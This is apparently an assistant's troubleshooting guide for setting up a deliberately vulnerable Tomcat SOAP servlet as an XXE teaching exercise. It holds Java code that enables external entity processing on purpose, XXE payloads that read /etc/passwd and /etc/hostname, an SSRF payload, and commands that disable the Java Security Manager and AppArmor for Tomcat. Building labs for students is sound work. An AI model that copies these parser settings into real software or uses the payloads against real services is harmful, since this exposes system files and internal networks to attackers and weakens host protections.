Let's perform a thorough troubleshooting to identify and resolve the issue. We'll verify each step to ensure that external entity processing is correctly enabled and that the malicious payload is processed as intended.

---

## **Step-by-Step Troubleshooting Guide**

### **1. Verify Modifications to `SOAPService.java`**

#### **a. Ensure Code Changes are Correct**

Double-check that you've made the necessary changes to `SOAPService.java` to explicitly enable external entity processing.

**Updated `SOAPService.java` Code:**

```java
package com.example;

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import javax.xml.parsers.*;
import org.w3c.dom.*;

public class SOAPService extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            // Initialize the document builder factory
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

            // Explicitly enable DTD processing (vulnerable to XXE)
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
            dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
            dbf.setExpandEntityReferences(true);

            DocumentBuilder db = dbf.newDocumentBuilder();
            Document doc = db.parse(request.getInputStream());

            // Extract the root element content
            String content = doc.getDocumentElement().getTextContent();

            // Respond with the extracted content
            response.setContentType("text/xml");
            PrintWriter out = response.getWriter();
            out.println("<response>" + content + "</response>");
        } catch (Exception e) {
            e.printStackTrace();
            response.setContentType("text/xml");
            PrintWriter out = response.getWriter();
            out.println("<response>Error processing request</response>");
        }
    }
}
```

**Important Changes:**

- **Enabled External Entity Processing:**
  - Set the features to allow external entities by setting them to `true` or `false` as appropriate.
- **Modified Response Logic:**
  - Extracted the content of the root element using `getTextContent()` and included it in the response.

#### **b. Save the Changes**

Ensure that the modified `SOAPService.java` file is saved properly.

```bash
sudo nano /var/lib/tomcat9/webapps/ROOT/WEB-INF/classes/com/example/SOAPService.java
```

- Paste the updated code.
- Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

### **2. Recompile the Servlet**

After modifying the Java file, you must recompile it.

```bash
cd /var/lib/tomcat9/webapps/ROOT/WEB-INF/classes
sudo javac -cp /usr/share/tomcat9/lib/servlet-api.jar com/example/SOAPService.java
```

- **Check for Compilation Errors:**
  - If any errors occur, fix them accordingly.
  - Ensure that the `javac` command completes successfully.

### **3. Restart the Tomcat Service**

Restart Tomcat to apply the changes.

```bash
sudo systemctl restart tomcat9
```

- **Verify the Service Status:**

  ```bash
  sudo systemctl status tomcat9
  ```

  - Ensure the service is active and running.

### **4. Confirm the Servlet is Updated**

To verify that the updated servlet is deployed:

#### **a. Check the Timestamp of the Class File**

```bash
ls -l /var/lib/tomcat9/webapps/ROOT/WEB-INF/classes/com/example/SOAPService.class
```

- Confirm that the timestamp matches the time when you recompiled the servlet.

### **5. Test with a Simple Payload**

Before testing the malicious payload, ensure that the servlet is working correctly with a simple payload.

#### **a. Create a Simple Payload**

Create a file named `simple_payload.xml`:

```bash
nano simple_payload.xml
```

Content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>Hello World</root>
```

Save and exit.

#### **b. Send the Simple Payload**

```bash
curl -X POST -H "Content-Type: application/xml" --data @simple_payload.xml http://<EXTERNAL_IP>/SOAPService
```

- Replace `<EXTERNAL_IP>` with your instance's external IP.

**Expected Response:**

```xml
<response>Hello World</response>
```

- If you receive this response, the servlet is correctly processing XML input and returning the content.

### **6. Test the Malicious Payload**

#### **a. Confirm the Malicious Payload**

Ensure that your `malicious_payload.xml` file contains the correct XXE payload.

```bash
nano malicious_payload.xml
```

Content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>&xxe;</root>
```

Save and exit.

#### **b. Send the Malicious Payload**

```bash
curl -X POST -H "Content-Type: application/xml" --data @malicious_payload.xml http://<EXTERNAL_IP>/SOAPService
```

**Expected Response:**

- The response should contain the contents of the `/etc/passwd` file.

**Example:**

```xml
<response>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
</response>
```

### **7. If the XXE Attack Still Doesn't Work**

If you're still receiving `<response>Success</response>` or not getting the expected content, consider the following:

#### **a. Check for Security Managers or Policies**

Tomcat or the Java runtime might have security policies that prevent file access.

- **Check Tomcat Security Manager:**

  - By default, the Tomcat Security Manager is not enabled, but verify this.

  - **Disable Security Manager (Not Recommended for Production):**

    In the Tomcat service file `/etc/systemd/system/tomcat9.service`, check for `-Djava.security.manager` and remove it if present.

#### **b. Adjust File Permissions**

- Ensure that the Tomcat user has read access to `/etc/passwd`.

- **Note:** `/etc/passwd` is usually world-readable, but if permissions have been altered, this could prevent access.

#### **c. Review Exception Logs**

Check the Tomcat logs for any exceptions that may indicate why the file cannot be read.

```bash
sudo tail -f /var/log/tomcat9/catalina.out
```

- Look for stack traces or error messages related to file access or XML parsing.

### **8. Alternative Testing**

If accessing `/etc/passwd` isn't working, try accessing a different file or network resource.

#### **a. Attempt to Read Another File**

Modify your payload to read a different file, such as `/etc/hostname`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "file:///etc/hostname" >
]>
<root>&xxe;</root>
```

Send the payload and check the response.

#### **b. Perform an SSRF Attack**

Attempt to access a network resource to see if external entities are processed.

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "http://example.com" >
]>
<root>&xxe;</root>
```

- This would attempt to fetch the content from `http://example.com`.

#### **c. Check for Error Messages**

If errors occur, they might be reflected in the response or logs, providing clues.

---

## **Possible Issues and Solutions**

### **Issue 1: Java Security Manager Restrictions**

**Solution:**

- Ensure the Java Security Manager is not restricting file access.

- **Disable Security Manager (for testing purposes only):**

  Edit the Tomcat service configuration:

  ```bash
  sudo nano /etc/systemd/system/multi-user.target.wants/tomcat9.service
  ```

  - Look for `-Djava.security.manager` and remove it if present.

  - Save and exit.

  - Reload the systemd daemon and restart Tomcat:

    ```bash
    sudo systemctl daemon-reload
    sudo systemctl restart tomcat9
    ```

### **Issue 2: SELinux or AppArmor Restrictions**

- Ubuntu uses AppArmor, which might restrict Tomcat's permissions.

**Solution:**

- Check if AppArmor is enforcing policies on Tomcat.

- **Disable AppArmor for Tomcat (Not Recommended for Production):**

  ```bash
  sudo ln -s /etc/apparmor.d/usr.share.tomcat9 /etc/apparmor.d/disable/
  sudo apparmor_parser -R /etc/apparmor.d/usr.share.tomcat9
  ```

  - Restart Tomcat:

    ```bash
    sudo systemctl restart tomcat9
    ```

### **Issue 3: File Permissions**

- Ensure that the user running Tomcat (`tomcat` user) has the necessary permissions.

**Solution:**

- **Adjust Permissions Carefully:**

  ```bash
  sudo chmod o+r /etc/passwd
  ```

  - Verify that `/etc/passwd` is world-readable.

---

## **Security Considerations**

- **Danger of Disabling Security Features:**

  - Disabling the Security Manager or AppArmor can expose the system to significant risks.

  - Only perform these actions in a controlled environment and revert the changes afterward.

- **Ethical Use Only:**

  - This exercise should be conducted responsibly, with a focus on educational outcomes.

---

## **Final Steps**

After performing the above troubleshooting steps, try sending the malicious payload again. If successful, you should see the contents of the targeted file in the response.

---

## **Summary**

- **Verify Code Changes:**

  - Ensure that `SOAPService.java` has the correct code and is recompiled.

- **Restart Services:**

  - Restart Tomcat after making changes.

- **Test with Simple Payload:**

  - Confirm that the servlet processes and returns XML content correctly.

- **Check Security Policies:**

  - Be aware of Java Security Manager, AppArmor, and file permissions that might prevent file access.

- **Review Logs:**

  - Examine Tomcat logs for any errors that provide insights.

---

## **Next Steps**

- **Once Working:**

  - You can proceed to set up the challenge for your students.

- **After the Exercise:**

  - Re-enable any security features you disabled.

  - Delete or secure the instance to prevent misuse.
